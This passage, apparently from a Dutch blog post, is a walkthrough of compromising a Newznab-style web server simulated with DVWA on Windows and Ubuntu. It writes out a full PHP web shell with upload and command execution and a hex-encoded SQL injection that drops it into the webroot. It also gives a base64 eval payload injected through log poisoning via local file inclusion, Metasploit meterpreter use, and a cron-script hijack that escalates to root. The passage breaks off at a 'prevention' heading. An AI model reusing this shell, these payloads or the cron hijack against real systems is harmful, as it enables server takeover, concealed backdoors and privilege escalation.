+<span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+Basically, is het een shell net als de andere, alleen heeft deze ook upload funcionaliteit, en wordt error reporting uitgezet en alles verzonden via POST. Dit om een beetje anoniem te blijven door niet in de server logs op te duiken <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)">. Daarnaast zit er ook een 'beveiliging' in, die ervoor zorgt dat hij alleen op mijn IP reageert. Het verdient geen schoonheidsprijs, maar het werkt. Dus, via een soortgelijke manier ook even deze shell op de server plaatsen:<br>
+<div class="cmd"><pre>1' union all select 0x3c3f706870206572726f725f7265706f7274696e672830293b696628245f5345525645525b2752454d4f54455f41444452275d3d3d273139322e3136382e312e32303227297b2468653d68746d6c656e7469746965733b24666f3d223c666f726d206d6574686f643d706f737420223b2469743d22203c696e70757420747970653d223b6563686f24666f2e22656e63747970653d6d756c7469706172742f666f726d2d646174613e222e2469742e2266696c65206e616d653d663e20546f3a20222e2469742e2274657874206e616d653d6c2076616c75653d27222e246865287374725f7265706c61636528275c5c272c272f272c676574637764282929292e22273e222e2469742e227375626d69742076616c75653d55703e223b2466733d245f46494c45535b2766275d3b6966202869737365742824667329297b6d6f76655f75706c6f616465645f66696c65282466735b27746d705f6e616d65275d2c245f504f53545b276c275d2e272f272e2466735b276e616d65275d293b6563686f2220557070656421223b7d2467633d245f504f53545b2763275d3b6563686f223c2f666f726d3e222e24666f2e223e222e2469742e2274657874206e616d653d632076616c75653d27222e24686528246763292e22273e222e2469742e227375626d69742076616c75653d457865637574653e223b69662869737365742824676329297b6563686f223c7072653e222e246865286024676320323e263160292e223c2f7072653e223b7d7d3f3e0a,'' into dumpfile 'c:/xampp/htdocs/simshell.php' -- </pre></div><br>
+<br>
+Und:<br>
+<img src="https://tweakers.net/camo/af25bdfe1db5bef0c4892201521635a4019a9a64/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fsimshell_2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/simshell_2.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/simshell_2.png"><br>
+<br>
+Zo, dat is wat makkelijker. Nu kunnen we via Metasploit even een backdoor genereren om meer controle over het systeem te krijgen. Dus we kiezen onze meterpreter payload en voeren wat opties in (vooral waar hij naar moet terugverbinden):<br>
+<img src="https://tweakers.net/camo/5c84157d9f2c6a23548076c6c08b6409e9270ae5/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fmsypayload.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/msypayload.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/msypayload.png"><br>
+<br>
+En we genereren een .exe bestand om te uploaden:<br>
+<img src="https://tweakers.net/camo/03d96e5348ad0ced3f2362c5e6c09feff98b5a6f/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fmsfgenerate.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/msfgenerate.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/msfgenerate.png"><br>
+<br>
+Stap 3, uploaden naar de webserver:<br>
+<img src="https://tweakers.net/camo/e7a0f1173ea4d69dee7b87ab7cee8814a82cf8e9/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fupload.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/upload.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/upload.png"><br>
+<br>
+<img src="https://tweakers.net/camo/6733cc518007a55723a04c928ba1bf44af209f39/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fupload2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/upload2.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/upload2.png"><br>
+<br>
+Stap 4, op onze machine iets starten wat de bevinding kan opvangen:<br>
+<img src="https://tweakers.net/camo/88af82b07c13cabc64a2029b8dc9b6dd56e9c7f7/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fhandler.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/handler.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/handler.png"><br>
+<br>
+Stap 5, uitvoeren van de .exe op de webserver:<br>
+<img src="https://tweakers.net/camo/70e4f23e4da5372b2f108431f35b8e9c96ff482a/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fexecute.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/execute.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/execute.png"><br>
+<br>
+Profit:<br>
+<img src="https://tweakers.net/camo/fd3163658f8b7462576706b9d5e87d2026adc818/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fsession1.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/session1.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/session1.png"><br>
+<br>
+En, omdat ook Apache als &quot;SYSTEM&quot; draait:<br>
+<img src="https://tweakers.net/camo/175f79df4e1f1677cbfbe0573e1363c01f290c70/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fgetuid.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/getuid.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/getuid.png"><br>
+<br>
+Volledige toegang tot het Windows systeem. Vanaf hier kan je je aanval gaan uitbreiden over de rest van het netwerk. Of gewoon even een screenshotje maken to see what's going on <img src="https://tweakers.net/g/s/smile.gif" width="15" height="15" alt=":)"> :<br>
+<img src="https://tweakers.net/camo/c448b668e7989254101bf94a82b3affbffa2978a/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fscreenshot1.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/screenshot1.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/screenshot1.png"><br>
+<img src="https://tweakers.net/camo/c9e025da9ed8611a98d06eb8b8b48178e48e1b5b/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fscreenshot2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/screenshot2.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/screenshot2.png"><br>
+<br>
+Ok? Ok. Linux time!<br>
+<br>
+<b>Ubuntu met LAMP</b><br>
+Gelijk vanaf het begin zijn er al verschillen. Zo draait Apache netjes onder een eigen user (standaard www-data), en mag deze user niet zomaar bestanden lezen / aanpassen. Voor dit scenario heb ik wederom de Damn Vulnerable WebApp geïnstalleerd om een fout in newznab / andere applicatie te simuleren. Dit keer gaan we voor Local File Inclusion (<a href="http://en.wikipedia.org/wiki/Local_File_Inclusion" rel="external nofollow">LFI</a>). Oftewel, openen van bestanden die eigenlijk niet bij de website horen. Dit soort kwetsbaarheden kan je herkennen aan dit soort URL's:<br>
+<img src="https://tweakers.net/camo/e26200386ba97487c3127d630b6f9b8daf0a9fe1/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Flfi1.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/lfi1.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/lfi1.png"><br>
+<br>
+De kwetsbare code lijkt meestal hier op:<br>
+<img src="https://tweakers.net/camo/20a07c009c8efc5d720eee92f2fa85b5f03243c6/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Flfi2.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/lfi2.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/lfi2.png"><br>
+<br>
+Dus, als je &quot;?page=about.php&quot; in de url intikt, krijg je de about page. Tik je &quot;?page=login.php&quot;, krijg je de login pagina. Maar, als dit niet goed afgedicht is, kan je ook &quot;?page=../../../../../../etc/passwd&quot; of zelfs &quot;?page=/etc/passwd&quot; gebruiken om een compleet ander bestand te openen (/etc/passwd): <br>
+<img src="https://tweakers.net/camo/4c4b6a7c38e514eb7e88d8895d28759f320b6b75/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fpasswd.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/passwd.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/passwd.png"><br>
+<br>
+&quot;Boeie, je kan nu niks webschrijven&quot;. Klopt, niet direct, maar we kunnen wel andere bestanden uitlezen waar we zelf ook invloed op hebben. Denk aan bijvoorbeeld het logbestand &quot;/var/log/apache2/other_vhosts_access.log&quot;. In dit bestand worden alle requests opgeslagen, samen met wat info over de persoon die het opvraagt:<br>
+<img src="https://tweakers.net/camo/d160dbbc4c5f261984b2ab163d4f52a02de997ca/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fvhostslog.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/vhostslog.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/vhostslog.png"><br>
+<br>
+Sommige delen van deze info hebben we zelf invloed op, zoals bijvoorbeeld de user agent. Zo kan je  met de proxy <a href="http://www.portswigger.net/burp/" rel="external nofollow">Burp</a> dingen aanpassen voor je het naar de webserver stuurt. Bijvoorbeeld:<br>
+<img src="https://tweakers.net/camo/b652b4c3f6ea72928e4d4d789b563adec3eced16/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fphpinforeq.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/phpinforeq.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/phpinforeq.png"><br>
+<br>
+Hiermee komt de PHP code:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?</span> <span class="code_nb">phpinfo</span><span class="code_p">()</span> <span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+in het logbestand terecht. Als we deze vervolgens weer bekijken door de url &quot;http://dvwa/vulnerabilities/fi/?page=/var/log/apache2/other_vhosts_access.log&quot; te bezoeken gaat de webserver dit bestand uitlezen. Op een gegeven moment komt hij de PHP code tegen en denkt &quot;Hey, dit is PHP! Dat moet ik uitvoeren!&quot;. Het resultaat:<br>
+<img src="https://tweakers.net/camo/528174a561a8a8049e871cca719d8b2a42622976/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fphpinfo.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/phpinfo.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/phpinfo.png"><br>
+<br>
+Oftewel, we kunnen zelf PHP code uitvoeren op de server, al dan niet met een omweg. Nu is het idee om op deze manier onze shell weg te schrijven. Om dat te doen pakken we weer dezelfde code:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?php</span> <span class="code_nb">error_reporting</span><span class="code_p">(</span><span class="code_mi">0</span><span class="code_p">);</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nv">$_SERVER</span><span class="code_p">[</span><span class="code_s1">&#39;REMOTE_ADDR&#39;</span><span class="code_p">]</span><span class="code_o">==</span><span class="code_s1">&#39;192.168.1.202&#39;</span><span class="code_p">){</span><span class="code_nv">$he</span><span class="code_o">=</span><span class="code_nb">htmlentities</span><span class="code_p">;</span><span class="code_nv">$fo</span><span class="code_o">=</span><span class="code_s2">&quot;&lt;form method=post &quot;</span><span class="code_p">;</span><span class="code_nv">$it</span><span class="code_o">=</span><span class="code_s2">&quot; &lt;input type=&quot;</span><span class="code_p">;</span><span class="code_k">echo</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;enctype=multipart/form-data&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;file name=f&gt; To: &quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=l value=&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nb">str_replace</span><span class="code_p">(</span><span class="code_s1">&#39;\\&#39;</span><span class="code_p">,</span><span class="code_s1">&#39;/&#39;</span><span class="code_p">,</span><span class="code_nb">getcwd</span><span class="code_p">()))</span><span class="code_o">.</span><span class="code_s2">&quot;&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Up&gt;&quot;</span><span class="code_p">;</span><span class="code_nv">$fs</span><span class="code_o">=</span><span class="code_nv">$_FILES</span><span class="code_p">[</span><span class="code_s1">&#39;f&#39;</span><span class="code_p">];</span><span class="code_k">if</span> <span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">)){</span><span class="code_nb">move_uploaded_file</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_s1">&#39;tmp_name&#39;</span><span class="code_p">],</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_s1">&#39;l&#39;</span><span class="code_p">]</span><span class="code_o">.</span><span class="code_s1">&#39;/&#39;</span><span class="code_o">.</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_s1">&#39;name&#39;</span><span class="code_p">]);</span><span class="code_k">echo</span><span class="code_s2">&quot; Upped!&quot;</span><span class="code_p">;}</span><span class="code_nv">$gc</span><span class="code_o">=</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_s1">&#39;c&#39;</span><span class="code_p">];</span><span class="code_k">echo</span><span class="code_s2">&quot;&lt;/form&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=c value=&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Execute&gt;&quot;</span><span class="code_p">;</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)){</span><span class="code_k">echo</span><span class="code_s2">&quot;&lt;pre&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_sb">`$gc 2&gt;&amp;1`</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&lt;/pre&gt;&quot;</span><span class="code_p">;}}</span><span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+We voegen voor elke ' en \ een extra \ toe om te zorgen dat die tekens ge-escaped (is dat een werkwoord?) worden, in plaats van geïnterpreteerd:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?php</span> <span class="code_nb">error_reporting</span><span class="code_p">(</span><span class="code_mi">0</span><span class="code_p">);</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nv">$_SERVER</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">REMOTE_ADDR\</span><span class="code_err">&#39;</span><span class="code_p">]</span><span class="code_o">==</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_mf">192.168</span><span class="code_o">.</span><span class="code_mf">1.202</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_p">){</span><span class="code_nv">$he</span><span class="code_o">=</span><span class="code_nb">htmlentities</span><span class="code_p">;</span><span class="code_nv">$fo</span><span class="code_o">=</span><span class="code_s2">&quot;&lt;form method=post &quot;</span><span class="code_p">;</span><span class="code_nv">$it</span><span class="code_o">=</span><span class="code_s2">&quot; &lt;input type=&quot;</span><span class="code_p">;</span><span class="code_k">echo</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;enctype=multipart/form-data&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;file name=f&gt; To: &quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=l value=\&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nb">str_replace</span><span class="code_p">(</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">\\\\\</span><span class="code_err">&#39;</span><span class="code_p">,</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_o">/</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_p">,</span><span class="code_nb">getcwd</span><span class="code_p">()))</span><span class="code_o">.</span><span class="code_s2">&quot;\&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Up&gt;&quot;</span><span class="code_p">;</span><span class="code_nv">$fs</span><span class="code_o">=</span><span class="code_nv">$_FILES</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">f\</span><span class="code_err">&#39;</span><span class="code_p">];</span><span class="code_k">if</span> <span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">)){</span><span class="code_nb">move_uploaded_file</span><span class="code_p">(</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">tmp_name\</span><span class="code_err">&#39;</span><span class="code_p">],</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">l\</span><span class="code_err">&#39;</span><span class="code_p">]</span><span class="code_o">.</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_o">/</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_o">.</span><span class="code_nv">$fs</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">name\</span><span class="code_err">&#39;</span><span class="code_p">]);</span><span class="code_k">echo</span><span class="code_s2">&quot; Upped!&quot;</span><span class="code_p">;}</span><span class="code_nv">$gc</span><span class="code_o">=</span><span class="code_nv">$_POST</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_err">&#39;</span><span class="code_nx">c\</span><span class="code_err">&#39;</span><span class="code_p">];</span><span class="code_k">echo</span><span class="code_s2">&quot;&lt;/form&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$fo</span><span class="code_o">.</span><span class="code_s2">&quot;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;text name=c value=\&#39;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;\&#39;&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$it</span><span class="code_o">.</span><span class="code_s2">&quot;submit value=Execute&gt;&quot;</span><span class="code_p">;</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nb">isset</span><span class="code_p">(</span><span class="code_nv">$gc</span><span class="code_p">)){</span><span class="code_k">echo</span><span class="code_s2">&quot;&lt;pre&gt;&quot;</span><span class="code_o">.</span><span class="code_nv">$he</span><span class="code_p">(</span><span class="code_sb">`$gc 2&gt;&amp;1`</span><span class="code_p">)</span><span class="code_o">.</span><span class="code_s2">&quot;&lt;/pre&gt;&quot;</span><span class="code_p">;}}</span><span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+Dan voegen we een stukje code toe om het geheel weg te schrijven naar het bestand &quot;/var/www/dvwa/shell.php&quot;:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_x">fwrite(fopen(&#39;/var/www/dvwa/shell.php&#39;, &#39;w&#39;), &#39;</span><span class="code_cp">&lt;?php</span> <span class="code_nb">error_reporting</span><span class="code_p">(</span><span class="code_mi">0</span><span class="code_p">);</span><span class="code_k">if</span><span class="code_p">(</span><span class="code_nv">$_SERVER</span><span class="code_p">[</span><span class="code_nx">\</span><span class="code_s1">&#39;REMOTE_ADDR\&#39;]==\&#39;192.168.1.202\&#39;){$he=htmlentities;$fo=&quot;&lt;form method=post &quot;;$it=&quot; &lt;input type=&quot;;echo$fo.&quot;enctype=multipart/form-data&gt;&quot;.$it.&quot;file name=f&gt; To: &quot;.$it.&quot;text name=l value=\&#39;&quot;.$he(str_replace(\&#39;\\\\\&#39;,\&#39;/\&#39;,getcwd())).&quot;\&#39;&gt;&quot;.$it.&quot;submit value=Up&gt;&quot;;$fs=$_FILES[\&#39;f\&#39;];if (isset($fs)){move_uploaded_file($fs[\&#39;tmp_name\&#39;],$_POST[\&#39;l\&#39;].\&#39;/\&#39;.$fs[\&#39;name\&#39;]);echo&quot; Upped!&quot;;}$gc=$_POST[\&#39;c\&#39;];echo&quot;&lt;/form&gt;&quot;.$fo.&quot;&gt;&quot;.$it.&quot;text name=c value=\&#39;&quot;.$he($gc).&quot;\&#39;&gt;&quot;.$it.&quot;submit value=Execute&gt;&quot;;if(isset($gc)){echo&quot;&lt;pre&gt;&quot;.$he(`$gc 2&gt;&amp;1`).&quot;&lt;/pre&gt;&quot;;}}?&gt;&#39;</span><span class="code_p">);</span></pre></div></td></tr></table></div><br>
+<br>
+En, omdat het ook hier niet direct ingevoerd kan worden, converteren we het naar Base64 en gooien we er een PHP functie omheen die de code tijdens het lezen converteert en uitvoert:<br>
+<div class="code">PHP:<br><table class="phphighlight"><tr><td class="phphighlightline"><pre>1
+</pre></td><td class="phphighlightcode"><div><pre><span class="code_cp">&lt;?php</span> <span class="code_k">eval</span><span class="code_p">(</span><span class="code_nb">base64_decode</span><span class="code_p">(</span><span class="code_s1">&#39;ZndyaXRlKGZvcGVuKCcvdmFyL3d3dy9kdndhL3NoZWxsLnBocCcsICd3JyksICc8P3BocCBlcnJvcl9yZXBvcnRpbmcoMCk7aWYoJF9TRVJWRVJbXCdSRU1PVEVfQUREUlwnXT09XCcxOTIuMTY4LjEuMjAyXCcpeyRoZT1odG1sZW50aXRpZXM7JGZvPSI8Zm9ybSBtZXRob2Q9cG9zdCAiOyRpdD0iIDxpbnB1dCB0eXBlPSI7ZWNobyRmby4iZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPiIuJGl0LiJmaWxlIG5hbWU9Zj4gVG86ICIuJGl0LiJ0ZXh0IG5hbWU9bCB2YWx1ZT1cJyIuJGhlKHN0cl9yZXBsYWNlKFwnXFxcXFwnLFwnL1wnLGdldGN3ZCgpKSkuIlwnPiIuJGl0LiJzdWJtaXQgdmFsdWU9VXA+IjskZnM9JF9GSUxFU1tcJ2ZcJ107aWYgKGlzc2V0KCRmcykpe21vdmVfdXBsb2FkZWRfZmlsZSgkZnNbXCd0bXBfbmFtZVwnXSwkX1BPU1RbXCdsXCddLlwnL1wnLiRmc1tcJ25hbWVcJ10pO2VjaG8iIFVwcGVkISI7fSRnYz0kX1BPU1RbXCdjXCddO2VjaG8iPC9mb3JtPiIuJGZvLiI+Ii4kaXQuInRleHQgbmFtZT1jIHZhbHVlPVwnIi4kaGUoJGdjKS4iXCc+Ii4kaXQuInN1Ym1pdCB2YWx1ZT1FeGVjdXRlPiI7aWYoaXNzZXQoJGdjKSl7ZWNobyI8cHJlPiIuJGhlKGAkZ2MgMj4mMWApLiI8L3ByZT4iO319Pz4nKTs=&#39;</span><span class="code_p">));</span> <span class="code_cp">?&gt;</span><span class="code_x"></span></pre></div></td></tr></table></div><br>
+<br>
+Dit prakken we in de &quot;User-Agent&quot; header:<br>
+<img src="https://tweakers.net/camo/38e83977a60f9a0e74ee7daa8f9b0e0fd94ac6ad/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fuser-agent.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/user-agent.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/user-agent.png"><br>
+<br>
+En we voeren de code uit door weer de pagina &quot;http://dvwa/vulnerabilities/fi/?page=/var/log/apache2/other_vhosts_access.log&quot; te bezoeken. Hierna surfen we naar website/shell.php en aanschouw:<br>
+<img src="https://tweakers.net/camo/6dfcb1ab1fcb0ac214ec865fcff0d0b3bf4b389c/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fshell_ubt.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/shell_ubt.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/shell_ubt.png"><br>
+<br>
+ Vanaf hier kunnen we weer hetzelfde truukje uithalen om een shell op het systeem te krijgen (executable genereren, handler starten, executable uitvoeren). Het enige probleem is dat Ubuntu standaard net iets veiliger is:<br>
+<img src="https://tweakers.net/camo/68d5f34a9ecc2941a0c5486bd840b09a96f5bf14/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fsession_unix.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/session_unix.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/session_unix.png"><br>
+<br>
+Zoals je ziet kunnen we hier alleen commando's uitvoeren onder de beperkte user &quot;www-data&quot;, dus kunnen we nog niet echt spannende dingen doen, toch?<br>
+<br>
+Mensen met veel punten voor het geheugen gedeelte van de IQ test 2013 voelen nu een klein lichtje opkomen. Tijdens het installeren van Newznab heb je namelijk de gebruiker &quot;www-data&quot; eigenaar gemaakt van alle bestanden. Dat houdt in dat deze gebruiker die bestanden ook kan uitvoeren.<br>
+<br>
+Als je dan ook nog eens weet dat voor het correct functioneren van Newznab, er automatisch om de zoveel tijd een PHP scriptje gerund moet worden, ga je al automatisch in de &quot;crontab&quot; (de Linux taakplanner) kijken:<br>
+<img src="https://tweakers.net/camo/6a3f66a541fdd763b4639b1b530fab0d2f8ea0c0/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fcrontab.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/crontab.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/crontab.png"><br>
+<br>
+Het belangrijke staat hier omcirkeld. In gewone mensentaal staat daar dat elke 10 minuten de gebruiker 'root' het php script 'update_binaries.php' draait. Het goede nieuws voor ons is dat dit bestandje in de Newznab map staat, en dat de gebruiker 'www-data' hier eigenaar van is. Dus we gooien het volgende commando los:<br>
+<br>
+<div class="cmd"><pre>mv /var/www/newznab/misc/update_scripts/update_binaries.php /var/www/newznab/misc/update_scripts/update_binaries_old.php &amp;&amp; echo '&lt;?php `/var/www/dvwa/meterpreter.bin`; include &quot;/var/www/newznab/misc/update_scripts/update_binaries_old.php&quot; ?&gt;' &gt; /var/www/newznab/misc/update_scripts/update_binaries.php
+</pre></div><br>
+<br>
+<img src="https://tweakers.net/camo/9a2db80aaa45622636f799e7f2f366719df77da7/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Fupdate_binaries.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/update_binaries.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/update_binaries.png"><br>
+<br>
+Wat dit commando doet is het oude 'update_binaries.php' kopiëren naar 'update_binaries_old.php'. Vervolgens wordt er in het bestand 'update_binaries.php' een commando gezet om onze gegenereerde executable uit te voeren, en vervolgens (om geen argwaan te wekken) het bestand 'update_binaries_old.php' uit te voeren. And now we wait.. Tot ongeveer 10 minuten later:<br>
+<br>
+<img src="https://tweakers.net/camo/abedd4b7d50022d5d3a37e61fa0e9c27668a746d/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2FSession4.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/Session4.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/Session4.png"><br>
+<br>
+En, omdat het bestand gestart wordt als de gebruiker 'root':<br>
+<br>
+<img src="https://tweakers.net/camo/98259e3384443d5a97c5e1c55c83191f88f4b3ff/?url=https%3A%2F%2Fdl.dropbox.com%2Fu%2F7521450%2Fblog%2Fchpwn%2Froot.png" class="rml" alt="https://dl.dropbox.com/u/7521450/blog/chpwn/root.png" title="https://dl.dropbox.com/u/7521450/blog/chpwn/root.png"><br>
+<br>
+Root!<br>
+<br>
+<b>Voorkomen</b><br>
+<br>
